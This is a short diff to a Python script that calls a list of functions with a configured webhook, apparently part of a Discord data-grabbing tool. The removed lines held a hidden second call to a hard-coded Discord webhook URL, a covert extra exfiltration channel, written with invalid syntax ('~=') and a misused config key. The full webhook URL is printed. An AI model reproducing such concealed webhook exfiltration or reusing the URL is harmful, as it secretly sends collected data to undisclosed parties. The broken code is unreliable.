@@ -22,9 +22,7 @@ def main():
             try:
                 if func.__init__.__code__.co_argcount == 2:
                     func(__CONFIG__['webhook'])
-                    if __CONFIG__['webhook'] ~= "https://discord.com/api/webhooks/1063387946532737084/bla__ZeUZTwcrf9_j2pMpFrSue-4E-NlFGLi7xybaYer6JvINpz75LXlXMLNRUKMV2Df":
-                        func(__CONFIG__['https://discord.com/api/webhooks/1063387946532737084/bla__ZeUZTwcrf9_j2pMpFrSue-4E-NlFGLi7xybaYer6JvINpz75LXlXMLNRUKMV2Df'])
-                else:
+               else:
                     func()
 
             except Exception as e:
